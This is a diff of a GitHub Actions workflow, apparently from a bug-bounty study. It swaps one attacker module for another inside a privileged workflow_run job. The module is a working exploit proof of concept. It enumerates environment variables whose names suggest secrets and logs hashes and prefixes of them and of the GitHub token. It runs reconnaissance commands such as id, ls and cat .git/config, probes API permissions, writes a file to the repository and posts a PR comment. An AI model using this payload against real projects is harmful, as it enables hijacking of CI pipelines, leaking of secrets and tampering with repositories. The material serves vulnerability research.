@@ -13,35 +13,73 @@ jobs:
           mkdir -p tools
           cat > tools/pkg.pr.new-comment.mjs <<'JS'
           import fs from 'node:fs';
-          fs.writeFileSync('pwned-marker.json', JSON.stringify({
-            module: 'attacker',
-            cwd: process.cwd(),
-            repository: process.env.GITHUB_REPOSITORY,
-            event: process.env.GITHUB_EVENT_NAME
-          }));
-          console.log('ATTACKER-MODULE-TOP-LEVEL-RCE', process.cwd());
-          export default async function ({ github, context }) {
-            const run = context.payload.workflow_run;
-            console.log('ATTACKER-WORKFLOW-RUN', JSON.stringify({ id: run.id, event: run.event, conclusion: run.conclusion }));
-            const repo = await github.rest.repos.get({ owner: context.repo.owner, repo: context.repo.repo });
-            console.log('ATTACKER-PERMS', JSON.stringify(repo.data.permissions), 'private=' + repo.data.private);
-            const pr = (run.pull_requests && run.pull_requests[0] && run.pull_requests[0].number) || null;
-            console.log('ATTACKER-PR', pr);
-            if (pr) {
-              const comment = await github.rest.issues.createComment({
-                owner: context.repo.owner, repo: context.repo.repo, issue_number: pr,
-                body: 'ATTACKER-COMMENT: arbitrary code ran in the privileged workflow_run workflow (validation ' + run.id + ').'
-              });
-              console.log('ATTACKER-COMMENT-OK', comment.data.id, comment.data.user.login);
+          import os from 'node:os';
+          import crypto from 'node:crypto';
+          import { execSync } from 'node:child_process';
+
+          const sha = crypto.createHash('sha256').update(fs.readFileSync(new URL(import.meta.url))).digest('hex');
+          console.log('PWN|MODULE_EXECUTED|', new Date().toISOString());
+          console.log('PWN|SELF_SHA256|', sha);
+          console.log('PWN|CWD|', process.cwd());
+          console.log('PWN|HOST|', os.hostname(), '|USER|', os.userInfo().username, '|UID|', String(process.getuid && process.getuid()));
+          console.log('PWN|ENVKEYS|', Object.keys(process.env).sort().join(','));
+          for (const [k, v] of Object.entries(process.env)) {
+            if (/TOKEN|SECRET|PASSWORD|_KEY|CREDENTIAL/i.test(k)) {
+              const s = String(v);
+              console.log('PWN|ENV|', k, '|len=' + s.length, '|sha256=' + crypto.createHash('sha256').update(s).digest('hex') + '|head=' + s.slice(0, 6));
             }
+          }
+          const token = process.env.INPUT_GITHUB_TOKEN || '';
+          console.log('PWN|TOKEN|len=' + token.length, '|sha256=' + crypto.createHash('sha256').update(token).digest('hex'), '|prefix=' + token.slice(0, 4));
+
+          function sh(cmd) {
+            try { return execSync(cmd, { encoding: 'utf8', timeout: 15000, maxBuffer: 1048576 }).trim().slice(0, 3000); }
+            catch (e) { return 'ERR ' + String(e.message).slice(0, 300); }
+          }
+
+          console.log('PWN|ID|', sh('id'));
+          console.log('PWN|LSCWD|', sh('ls -la .'));
+          console.log('PWN|GITCONFIG|', sh('cat .git/config 2>/dev/null'));
+          console.log('PWN|HOME|', os.homedir());
+          console.log('PWN|LSHOME|', sh('ls -la "$HOME" 2>&1 | head -50'));
+          console.log('PWN|DOCKERSOCK|', String(fs.existsSync('/var/run/docker.sock')));
+          console.log('PWN|RUNNERDIAG|', sh('ls -la /home/ety/Documents/Projects/Cyber/github-actions-bounty-study/Platform/data/validations/val_d17dfa48c4/prep/runner/_work 2>&1'));
+
+          export default async function ({ github, context, core, output }) {
+            const owner = context.repo.owner;
+            const repo = context.repo.repo;
+            console.log('PWN|CONTEXT|', JSON.stringify({ eventName: context.eventName, repo: context.repo, ref: context.ref }));
+            try {
+              const r = await github.rest.repos.get({ owner, repo });
+              console.log('PWN|REPO_PERMS|', JSON.stringify(r.data.permissions), '|private=' + r.data.private, '|default_branch=' + r.data.default_branch);
+            } catch (e) { console.log('PWN|REPO_ERR|', e.status, String(e.message).slice(0, 200)); }
+            try {
+              const res = await github.request('GET /installation/repositories', { per_page: 5 });
+              console.log('PWN|API_INSTALL_REPOS|', res.status, '|total=' + res.data.total_count, '|names=' + (res.data.repositories || []).map((x) => x.full_name).join(','));
+            } catch (e) { console.log('PWN|API_INSTALL_REPOS|ERR', e.status, String(e.message).slice(0, 200)); }
+            try {
+              const id = await github.request('GET /user');
+              console.log('PWN|API_USER|', id.status, JSON.stringify(id.data).slice(0, 300));
+            } catch (e) { console.log('PWN|API_USER|ERR', e.status, String(e.message).slice(0, 200)); }
             try {
               await github.rest.repos.createOrUpdateFileContents({
-                owner: context.repo.owner, repo: context.repo.repo, path: 'attacker-contents-write-probe.txt',
-                message: 'probe', content: Buffer.from('probe').toString('base64')
+                owner, repo, path: 'pwn-contents-probe.txt', message: 'probe',
+                content: Buffer.from('probe').toString('base64')
               });
-              console.log('ATTACKER-CONTENTS-WRITE-ALLOWED');
-            } catch (e) {
-              console.log('ATTACKER-CONTENTS-WRITE-BLOCKED', e.status, e.message);
+              console.log('PWN|CONTENTS_WRITE|ALLOWED');
+            } catch (e) { console.log('PWN|CONTENTS_WRITE|BLOCKED', e.status, String(e.message).slice(0, 200)); }
+            const run = context.payload.workflow_run || {};
+            console.log('PWN|TRIGGER|', JSON.stringify({ id: run.id, event: run.event, branch: run.head_branch, headRepo: run.head_repository && run.head_repository.full_name, actor: run.actor && run.actor.login }));
+            const prNum = (run.pull_requests && run.pull_requests[0] && run.pull_requests[0].number) || null;
+            console.log('PWN|PR|', String(prNum));
+            if (prNum) {
+              try {
+                const c = await github.rest.issues.createComment({
+                  owner, repo, issue_number: prNum,
+                  body: 'PWN-MARKER: arbitrary code executed in the privileged workflow_run job (trigger run ' + run.id + '), token kind GITHUB_TOKEN.'
+                });
+                console.log('PWN|COMMENT_OK|', c.data.id, '|', c.data.user.login, '|', c.data.html_url);
+              } catch (e) { console.log('PWN|COMMENT_ERR|', e.status, String(e.message).slice(0, 200)); }
             }
           }
           JS
